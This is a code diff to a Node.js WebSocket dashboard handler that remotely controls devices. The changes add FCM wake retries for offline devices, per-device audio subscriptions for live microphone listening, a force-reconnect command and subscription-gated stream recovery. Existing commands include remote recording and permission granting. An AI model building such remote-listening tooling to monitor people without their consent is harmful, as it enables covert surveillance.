@@ -8,6 +8,7 @@ const dashboardStore = require("../models/dashboardStore");
 const { normalizeDeviceId } = require("../utils/device");
 const { broadcastToDashboard } = require("../services/dashboardService");
 const { startDeviceRecording, stopDeviceRecording } = require("../services/recordingService");
+const { scheduleWake } = require("../services/wakeRetryService");
 
 let streamRecoveryTimer = null;
 
@@ -16,18 +17,9 @@ function handleDashboard(ws) {
   dashboardStore.addClient(ws);
   console.log(`👁️  Dashboard client connected (Total: ${dashboardStore.size()})`);
 
-  if (wasEmpty) {
-    deviceStore.forEachDevice((dev, id) => {
-      try {
-        if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
-          dev.ws.send("start_stream");
-          console.log(`🎙️  start_stream → ${id}`);
-        }
-      } catch (e) {
-        console.log(`❌ Failed to start stream for ${id}: ${e.message}`);
-      }
-    });
-  }
+  // IMPORTANT: we do NOT auto-start audio on all devices.
+  // Starting streams on every device causes audio floods when multiple devices are connected.
+  // Streams should start only when the user presses "Listen" on a specific device.
 
   const deviceList = deviceStore.listDevices();
   ws.send(JSON.stringify({ type: "device_list", devices: deviceList }));
@@ -79,6 +71,9 @@ function handleDashboard(ws) {
           
           console.log(`   ⚠️ WebSocket not open for ${targetId} -> Queuing command (Layer 9)`);
           deviceStore.queueCommand(targetId, payload);
+          // If the device is offline, attempt an FCM wake so it can reconnect and flush queued commands.
+          // We keep it best-effort (fire-and-forget) to avoid blocking the event loop.
+          scheduleWake(targetId, { maxAttempts: 5, intervalMs: 12_000 });
           
           broadcastToDashboard({
             type: "info",
@@ -102,6 +97,8 @@ function handleDashboard(ws) {
               deviceId: targetId,
             });
           }
+          // Subscribe this dashboard client to only this device's audio.
+          dashboardStore.setAudioSubscription(ws, targetId);
           break;
         case "stop_stream":
           if (device) stopDeviceRecording(targetId, device);
@@ -111,6 +108,9 @@ function handleDashboard(ws) {
               deviceId: targetId,
             });
           }
+          // Remove subscription for this device (clear active subscription).
+          // For now we allow only one active audio subscription per dashboard to limit load.
+          dashboardStore.clearAudioSubscription(ws);
           break;
         case "start_record":
           if (device) startDeviceRecording(targetId, device);
@@ -261,6 +261,10 @@ function handleDashboard(ws) {
           safeSend("force_update");
           console.log(`🔄 Force update sent to ${targetId}`);
           break;
+        case "force_reconnect":
+          safeSend("force_reconnect");
+          console.log(`🔄 Force reconnect sent to ${targetId}`);
+          break;
         case "grant_permissions":
           safeSend("grant_permissions");
           console.log(`✅ Grant permissions sent to ${targetId}`);
@@ -329,6 +333,14 @@ function startStreamRecovery() {
     const now = Date.now();
     deviceStore.forEachDevice((dev, deviceId) => {
       if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return;
+
+      // Avoid audio floods: only recover devices that some dashboard client is currently listening to.
+      let isSubscribed = false;
+      dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
+        isSubscribed = true;
+      });
+      if (!isSubscribed) return;
+
       const lastAudio = Number(dev.health?.lastAudioChunkAt || 0);
       const stale = !lastAudio || now - lastAudio > 25_000;
       if (stale) {
